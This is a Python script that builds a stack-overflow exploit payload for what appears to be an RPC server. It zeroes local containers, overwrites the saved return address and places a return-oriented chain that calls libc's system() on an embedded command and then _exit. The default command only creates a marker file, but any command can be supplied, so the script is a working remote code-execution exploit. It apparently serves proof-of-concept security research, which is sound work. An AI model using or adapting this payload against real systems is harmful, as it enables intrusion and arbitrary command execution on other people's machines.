#!/usr/bin/env python3
"""Build the bounded early-return payload.

Layout offsets are from &cmd in the pinned -fno-stack-protector Debug build,
measured with gdb on loopback SoftRoCE:
  +33   rpc_server.buffers (unordered_set); zeroed so ~rpc_server is a no-op
  +761  saved RIP slot
  +1025 sock shared_ptr (left untouched; payload ends at 1024)
Chain: ret (alignment), pop rdi; ret, &command string, system, pop rdi; ret, 0, _exit.
"""
import argparse
import struct

SAVED_RIP = 761
STRING_OFF = 900
LENGTH = 1024
COMMAND = b"touch /tmp/llamarpc2shell-r5-marker\x00"
p = argparse.ArgumentParser()
p.add_argument("--saved-rip", default=SAVED_RIP, type=int,
               help="saved RIP offset from &cmd (default: no-canary layout 761)")
p.add_argument("--string-off", default=STRING_OFF, type=int,
               help="command string offset from &cmd (default: 900)")
p.add_argument("--length", default=LENGTH, type=int,
               help="payload length (default: 1024)")
p.add_argument("--command", default=COMMAND.decode(),
               help="NUL-terminated command embedded in the payload")
p.add_argument("--cmd-addr", required=True, type=lambda s: int(s, 0))
p.add_argument("--libc-base", required=True, type=lambda s: int(s, 0))
p.add_argument("--out", required=True)
a = p.parse_args()

b = bytearray(a.length)
b[0] = 0x0F                       # any byte; recv_data fails before cmd is used
# offsets 1..SAVED_RIP-1 stay zero: all rpc_server locals become empty containers
libc = a.libc_base
chain = [
    libc + 0x28A92,               # ret, 16-byte stack alignment
    libc + 0x10F84B,              # pop rdi; ret
    a.cmd_addr + a.string_off,   # command string in the same SEND
    libc + 0x58750,               # system
    libc + 0x10F84B,              # pop rdi; ret
    0,                            # status for _exit
    libc + 0xEE2C0,               # _exit
]
for i, value in enumerate(chain):
    struct.pack_into("<Q", b, a.saved_rip + i * 8, value)
command = a.command.encode() + b"\x00"
b[a.string_off:a.string_off + len(command)] = command
with open(a.out, "wb") as f:
    f.write(b)
print(f"{a.out}: {a.length} bytes, cmd={a.cmd_addr:#x}, libc={a.libc_base:#x}, "
      f"string={a.cmd_addr + a.string_off:#x}, saved_rip=+{a.saved_rip}")
